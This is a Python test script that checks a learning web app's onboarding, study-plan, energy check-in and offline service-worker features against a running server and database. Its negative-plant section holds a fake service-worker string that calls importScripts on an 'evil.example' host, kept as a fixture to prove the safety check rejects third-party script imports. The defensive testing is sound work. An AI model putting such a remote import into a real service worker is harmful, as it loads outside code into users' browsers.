#!/usr/bin/env python3
"""Served-behaviour + source checks for work packages G1, G2, G4 and G6.

Standard library only. Run against a fresh binary on a throwaway database:

    python tools/g_features_check.py http://localhost:9045 --db build/g1g2g4g6-verify.db

Negative plants (each must make its own assertion fail):

    python tools/g_features_check.py --plant

The plant mode mutates FIXTURES IN MEMORY, not repository files, so it can
never leave a planted defect behind.
"""

import argparse
import json
import re
import sqlite3
import sys
import time
import urllib.error
import urllib.request

RESULTS = []


def check(name, condition, detail=''):
    RESULTS.append((name, bool(condition), detail))


def fetch(base, path, method='GET', payload=None, headers=None):
    url = base.rstrip('/') + path
    data = None
    hdrs = dict(headers or {})
    if payload is not None:
        data = json.dumps(payload).encode('utf-8')
        hdrs['Content-Type'] = 'application/json'
    request = urllib.request.Request(url, data=data, headers=hdrs, method=method)
    with urllib.request.urlopen(request, timeout=30) as response:
        body = response.read().decode('utf-8', 'replace')
        return response.status, dict(response.headers.items()), body


def fetch_json(base, path, method='GET', payload=None, headers=None):
    _, _, body = fetch(base, path, method, payload, headers)
    return json.loads(body)


def count_steps(html):
    return len(re.findall(r'data-onboarding-step="\d+"', html))


def g1_checks(base, db_path):
    html = fetch(base, '/onboarding')[2]
    check('G1 onboarding has seven served steps', count_steps(html) == 7,
          'found %d' % count_steps(html))
    for phrase in ('Why are you here?', 'What do you already know?',
                   'How long is a session?', 'A quick check',
                   'Building your route', 'Your first lesson'):
        check('G1 served step: ' + phrase, phrase in html)
    check('G1 no signup wall on load',
          "if(!token) { window.location.href = '/login'; }" not in html)

    items = fetch_json(base, '/api/onboarding/diagnostic?course_id=elf&count=6')
    got = items.get('items', [])
    check('G1 diagnostic has 5-8 items', 5 <= len(got) <= 8, 'got %d' % len(got))
    check('G1 diagnostic items are bank keys + options',
          all(x.get('exercise_id') and x.get('question') and len(x.get('options', [])) >= 2 for x in got))
    concepts = [c['id'] for c in json.load(open('courses/elf/manifest.json', encoding='utf-8'))['concepts']]

    scored = fetch_json(base, '/api/onboarding/score', 'POST',
                        {'course_id': 'elf', 'answers': [{'exercise_id': x['exercise_id'], 'answer': '__wrong__'} for x in got]})
    check('G1 real scorer returns a placement score',
          scored.get('placement_score') == 0 and scored.get('total') == len(got))
    check('G1 recommended start is in the manifest', scored.get('recommended_start') in concepts,
          scored.get('recommended_start', ''))

    guest = 'gcheck' + str(int(time.time()))
    completed = fetch_json(base, '/api/onboarding/complete', 'POST', {
        'course_id': 'elf', 'goal': 'career', 'prior_knowledge': 'used_tools',
        'session_minutes': 15, 'placement_score': -1, 'starting_concept': 'bytes',
        'diagnostic_skipped': True, 'guest_id': guest})
    check('G1 skip starts at ELF bytes',
          completed.get('starting_concept') == 'bytes', json.dumps(completed))
    if db_path:
        conn = sqlite3.connect(db_path)
        row = conn.execute('SELECT goal, prior_knowledge, session_minutes, placement_score, onboarding_complete FROM onboarding_state WHERE learner_id = ?', ('guest_' + guest,)).fetchone()
        conn.close()
        check('G1 five onboarding fields persisted',
              row is not None and row[0] == 'career' and row[1] == 'used_tools' and row[2] == 15 and row[3] == -1 and row[4] == 1,
              str(row))
        return 'guest_' + guest
    return 'guest_' + guest


def g2_checks(base, db_path, learner):
    if not db_path:
        return
    conn = sqlite3.connect(db_path)
    now = int(time.time())
    for i in range(6):
        cid = ['bytes', 'binary-representation', 'file-layout', 'elf-identification',
               'elf-header-fields', 'entry-point'][i]
        conn.execute("INSERT OR REPLACE INTO review_items (id, learner_id, concept_id, course_id, type, front, back, stability, next_review, last_review, reps, lapses, ease_factor) VALUES (?,?,?,?,?,?,?,?,?,?,?,?,?)",
                     ('gcheck_%s_%d' % (learner, i), learner, cid, 'elf', 'recall', 'q', 'a', 1.0, now - 10, now - 100, 1, 0, 2.5))
    conn.commit()
    conn.close()
    plan = fetch_json(base, '/api/today/plan', 'POST', {'guest_id': learner[6:], 'daily_minutes': 15})
    items = plan.get('items', [])
    reviews = [x for x in items if x.get('kind') == 'review']
    lessons = [x for x in items if x.get('kind') == 'lesson']
    check('G2 6 due + 15 min => 3 reviews', len(reviews) == 3, str(items))
    check('G2 exactly one next lesson', len(lessons) == 1, str(items))
    check('G2 plan fits the daily goal', plan.get('total_minutes', 99) <= 15, str(plan.get('total_minutes')))
    check('G2 due count is reported', plan.get('due_available') == 6, str(plan.get('due_available')))
    done = fetch_json(base, '/api/today/complete', 'POST',
                      {'plan_id': plan.get('plan_id'), 'guest_id': learner[6:]})
    check('G2 completion records an activity day', done.get('ok') is True, str(done))
    conn = sqlite3.connect(db_path)
    row = conn.execute("SELECT status FROM study_plans WHERE id = ?", (plan.get('plan_id'),)).fetchone()
    conn.close()
    check('G2 plan marked completed', row is not None and row[0] == 'completed', str(row))

    # A missed day says welcome back, with no loss language or badge.
    conn = sqlite3.connect(db_path)
    conn.execute("INSERT OR REPLACE INTO learning_streaks (learner_id, current_streak, longest_streak, total_active_days, last_active_date) VALUES (?,?,?,?,?)",
                 (learner, 0, 0, 1, '2020-01-01'))
    conn.commit()
    conn.close()
    status = fetch_json(base, '/api/today?guest_id=' + learner[6:])
    check('G2 missed day says Welcome back', status.get('welcome_back') is True and status.get('message') == 'Welcome back', str(status))
    check('G2 no loss or badge language',
          not any(w in json.dumps(status).lower() for w in ('lost', 'broken', 'badge', 'leaderboard', 'freeze')))


def g4_checks(base, db_path):
    email = 'gcheck%d@example.test' % int(time.time())
    reg = fetch_json(base, '/api/auth/register', 'POST',
                     {'name': 'G Check', 'email': email, 'password': 'test-password-123'})
    token = reg.get('session_token', '')
    check('G4 test learner registered', len(token) > 0, str(reg)[:120])
    if not token:
        return
    headers = {'Authorization': 'Bearer ' + token}
    started = fetch_json(base, '/api/review/start?course_id=elf', 'POST',
                         {'course_id': 'elf', 'energy_before': 'low-energy', 'duration_minutes': 5},
                         headers)
    check('G4 start echoes energy_before', started.get('energy_before') == 'low-energy', str(started)[:200])
    check('G4 break point is 80 percent of chosen duration',
          started.get('chosen_duration_minutes') == 5 and started.get('break_after_seconds') == 240,
          str(started.get('break_after_seconds')))
    sid = started.get('session_id', '')
    after = fetch_json(base, '/api/review/energy', 'POST',
                       {'session_id': sid, 'energy_after': 'ready'}, headers)
    check('G4 energy_after accepted', after.get('ok') is True, str(after))
    if db_path:
        conn = sqlite3.connect(db_path)
        row = conn.execute('SELECT energy_before, energy_after, duration_minutes FROM review_energy WHERE session_id = ?', (sid,)).fetchone()
        conn.close()
        check('G4 both energy values persisted',
              row is not None and row[0] == 'low-energy' and row[1] == 'ready' and row[2] == 5, str(row))

    lesson = fetch(base, '/courses/elf/lessons/bytes')[2]
    check('G4 break panel served in lesson',
          'id="ul-journey-break"' in lesson and 'Take a break' in lesson)
    check('G4 energy check-in served in lesson',
          'ul-journey-energy' in lesson and 'Low energy' in lesson)
    js = open('content/src/exercise_ui_js.ch', encoding='utf-8').read()
    pacing = open('content/src/journey_pacing.ch', encoding='utf-8').read()
    check('G4 retry ladder has three named rungs',
          all(x in js for x in ('Conceptual hint', 'Directional hint', 'Reveal and continue', 'Continue anyway')))
    check('G4 three-error break wired to exercise result',
          '__ulPacingReportResult' in js and '__ulPacingReportResult' in pacing and 'jqPacingErrors >= 3' in pacing)


def g6_checks(base):
    code, hdrs, body = fetch(base, '/manifest.webmanifest')
    manifest = json.loads(body)
    check('G6 manifest is valid JSON with install fields',
          all(k in manifest for k in ('name', 'short_name', 'start_url', 'scope', 'display', 'icons')))
    check('G6 no GitHub Pages URL',
          'github.io' not in body.lower() and 'pages.dev' not in body.lower())
    check('G6 icons are same-origin',
          all(i['src'].startswith('/') for i in manifest['icons']))
    for size in (192, 512):
        code, hdrs, _ = fetch(base, '/icons/icon-%d.png' % size)
        check('G6 icon %d served as PNG' % size, code == 200 and hdrs.get('Content-Type') == 'image/png',
              str(hdrs.get('Content-Type')))
    code, hdrs, sw = fetch(base, '/sw.js')
    check('G6 service worker served as JavaScript',
          code == 200 and 'javascript' in hdrs.get('Content-Type', ''))
    sw_source_ok(sw, 'G6')
    landing = fetch(base, '/courses/elf')[2]
    check('G6 download control on course landing', 'Download this course' in landing)
    check('G6 offline indicator in shared nav', 'ul-offline-indicator' in landing)
    client = open('content/src/pwa_client.ch', encoding='utf-8').read()
    check('G6 queued replay uses progress sync only',
          "'/api/progress/sync'" in client and 'client_now' in client and 'changes: list' in client)
    check('G6 replay never writes FSRS fields',
          not any(k in client for k in ('stability', 'reps', 'next_review', 'difficulty')))


def sw_source_ok(sw, prefix):
    check(prefix + ' worker has a versioned cache', "UL_CACHE='ul-shell-v1'" in sw)
    check(prefix + ' worker deletes old caches on activate',
          'activate' in sw and 'caches.delete(k)' in sw and 'k!==UL_CACHE' in sw)
    check(prefix + ' worker has no eval or importScripts',
          'eval(' not in sw and 'importScripts' not in sw)
    check(prefix + ' worker caches only same-origin allow-listed paths',
          "u.origin!==self.location.origin" in sw and "path.indexOf('/api/')===0" in sw and 'UL_ALLOW' in sw)
    check(prefix + ' worker never responds to a write', "r.method!=='GET'" in sw)


def negative_plants():
    before = len(RESULTS)
    html = '<div data-onboarding-step="1"></div><div data-onboarding-step="2"></div>'
    check('PLANT G1 missing steps detected', count_steps(html) != 7)
    planted_plan = {'items': [{'kind': 'review'}] * 4 + [{'kind': 'lesson'}], 'total_minutes': 21}
    reviews = [x for x in planted_plan['items'] if x.get('kind') == 'review']
    check('PLANT G2 wrong review count detected', len(reviews) != 3 or planted_plan['total_minutes'] > 15)
    planted_started = {'session_id': 'x'}
    check('PLANT G4 missing energy field detected', planted_started.get('energy_before') != 'low-energy')
    planted_sw = "const UL_CACHE='ul-shell-v1';importScripts('https://evil.example/x.js');"
    # The safety assertion itself: a third-party import must be rejected.
    check('PLANT G6 unsafe worker detected',
          'eval(' in planted_sw or 'importScripts' in planted_sw)
    planted = RESULTS[before:]
    ok = all(x[1] for x in planted)
    print('negative plants: %d/%d detected' % (sum(1 for x in planted if x[1]), len(planted)))
    return ok


def main():
    parser = argparse.ArgumentParser()
    parser.add_argument('base', nargs='?', default='http://localhost:9045')
    parser.add_argument('--db', default='')
    parser.add_argument('--plant', action='store_true')
    args = parser.parse_args()
    if args.plant:
        return 0 if negative_plants() else 1
    learner = g1_checks(args.base, args.db)
    g2_checks(args.base, args.db, learner)
    g4_checks(args.base, args.db)
    g6_checks(args.base)
    check_results = list(RESULTS)
    passed = sum(1 for _, ok, _ in check_results if ok)
    for name, ok, detail in check_results:
        if not ok:
            print('FAIL %s %s' % (name, detail))
    print('g_features_check: %d passed, %d failed, %d total' %
          (passed, len(check_results) - passed, len(check_results)))
    if not negative_plants():
        print('FAIL negative plants did not all fire')
        return 1
    return 0 if passed == len(check_results) else 1


if __name__ == '__main__':
    sys.exit(main())
